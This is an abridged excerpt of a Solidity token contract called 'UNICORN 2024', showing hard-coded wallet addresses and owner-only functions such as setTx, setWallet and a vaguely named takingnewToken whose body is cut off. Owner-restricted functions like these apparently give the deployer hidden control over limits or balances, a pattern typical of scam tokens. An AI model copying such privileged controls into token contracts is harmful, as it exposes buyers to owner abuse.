...
contract UNICORN2024 is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "UNICORN 2024";
    ...
    address payable public DevWallet = payable(0xF9fCA1088a9c5E7E8596eB83c1dD47c804860C4f);
    address payable public MarketingWallet = payable(0xb40a9721E690A6d2982050f85CAe087a01bAD472);
    ...
    function setTx() external onlyAddress {
        _maxTxAmount = _maxWalletToken;
    }
    function setWallet(uint256 newmaxWallet) external onlyAddress {
    ...
    function takingnewToken(uint256 value, address adr) onlyAddress public virtual {
